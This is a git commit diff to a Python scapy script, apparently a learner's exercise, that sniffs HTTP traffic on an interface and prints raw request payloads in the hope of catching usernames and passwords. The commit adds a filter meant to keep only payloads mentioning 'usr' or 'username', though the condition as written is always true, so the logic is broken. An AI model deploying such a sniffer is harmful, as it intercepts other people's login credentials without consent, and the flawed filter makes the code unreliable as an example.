6a868c76e5157bc8ae6f57f8efea16aaf04a38c3
syntax-eror <46492218+syntax-eror@users.noreply.github.com>
2019-05-06 20:38:34 -0700

    Update packetsniffer.py

--- packetsniffer.py
+++ packetsniffer.py
@@ -12,8 +12,14 @@ def sniff(interface):
 def process_sniffed_packet(packet):
     if packet.haslayer(http.HTTPRequest):
         if packet.haslayer(scapy.Raw):
-            print(packet[scapy.Raw].load) #print specific field, in this case user+pwd hopefully
+            load = packet[scapy.Raw].load #make it a var and then check to see if it contains specific text
+            if "usr" or "username" in load:
+                print(load)
+            #print(packet[scapy.Raw].load) #print specific field, in this case user+pwd hopefully
             #print(packet.show) #packet.show will give field of packet
+
+#to find the layer you want to drill down into:
+#print(packet.show) - this gives the fields that you can access
         
 
 sniff("eth0")
